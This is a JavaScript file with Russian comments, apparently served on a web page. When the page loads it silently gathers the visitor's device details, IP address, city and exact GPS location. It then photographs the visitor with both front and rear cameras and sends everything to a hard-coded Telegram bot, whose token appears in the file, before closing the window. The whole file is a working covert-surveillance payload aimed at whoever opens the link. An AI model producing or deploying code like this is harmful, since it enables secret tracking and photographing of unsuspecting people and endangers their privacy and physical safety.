// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8583690981:AAH_esCG5wUMmRiegjxDARFQDW6l-VxfJ9w';
const CHAT_ID = '526758225';

const video = document.getElementById('video');

// ========== ОТПРАВКА ==========
async function sendMessage(text) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendPhoto(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

// ========== ВСЯ ИНФОРМАЦИЯ ==========
async function sendAllInfo() {
    const ua = navigator.userAgent;
    let os = 'Unknown';
    if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iPhone') > -1) os = 'iOS';
    else if (ua.indexOf('Windows') > -1) os = 'Windows';
    else if (ua.indexOf('Mac') > -1) os = 'MacOS';
    
    let browser = 'Unknown';
    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
    else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
    else if (ua.indexOf('Edg') > -1) browser = 'Edge';
    
    const screenSize = `${screen.width}x${screen.height}`;
    const time = new Date().toLocaleString('ru-RU');
    
    let battery = '';
    if ('getBattery' in navigator) {
        try {
            const b = await navigator.getBattery();
            battery = `🔋 Батарея: ${Math.floor(b.level * 100)}% (${b.charging ? 'на зарядке' : 'не заряжается'})`;
        } catch(e) {}
    }
    
    let connection = '';
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        connection = `📡 Интернет: ${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'} Мбит/с)`;
    }
    
    let ip = '';
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = `🌍 IP: ${data.ip}\n📍 Регион: ${data.city}, ${data.region}, ${data.country_name}`;
    } catch(e) {}
    
    const message = `📱 Устройство: ${os} | ${browser}
📐 Экран: ${screenSize}
⏰ Время: ${time}
${battery}
${connection}
${ip}`;
    
    await sendMessage(message);
}

// ========== ГЕОЛОКАЦИЯ (Яндекс.Карты) ==========
function getGeo(callback) {
    if (!navigator.geolocation) {
        callback(null);
        return;
    }
    navigator.geolocation.getCurrentPosition(
        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        () => callback(null)
    );
}

// ========== КАМЕРА ==========
function getCamera(facing, callback) {
    navigator.mediaDevices.getUserMedia({
        video: { 
            facingMode: { exact: facing }, 
            width: { ideal: 1080 },
            height: { ideal: 1920 }
        }
    }).then(stream => callback(stream)).catch(() => callback(null));
}

async function takePhoto(stream, caption) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        const track = stream.getVideoTracks()[0];
        const settings = track.getSettings();
        
        let width = settings.width || 1080;
        let height = settings.height || 1920;
        
        // Делаем вертикальное фото (портрет)
        if (width > height) {
            [width, height] = [height, width];
        }
        
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        
        video.srcObject = stream;
        video.play();
        
        setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                await sendPhoto(blob, caption);
                resolve();
            }, 'image/jpeg', 0.9);
        }, 500);
    });
}

// ========== ГЛАВНАЯ ==========
async function main() {
    // 1. Вся информация
    await sendAllInfo();
    
    // 2. Геолокация
    getGeo(async (loc) => {
        if (loc) {
            await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
        }
        
        // 3. Камера
        getCamera('user', async (stream) => {
            if (stream) {
                // Фронтальное фото (вертикальное)
                await takePhoto(stream, '📸 Фронтальная камера');
                
                // Ждем 3 секунды
                setTimeout(async () => {
                    getCamera('environment', async (backStream) => {
                        if (backStream) {
                            await takePhoto(backStream, '📸 Задняя камера');
                            backStream.getTracks().forEach(t => t.stop());
                        }
                        stream.getTracks().forEach(t => t.stop());
                        setTimeout(() => window.close(), 1000);
                    });
                }, 3000);
            } else {
                setTimeout(() => window.close(), 1000);
            }
        });
    });
}

// ЗАПУСК
main();
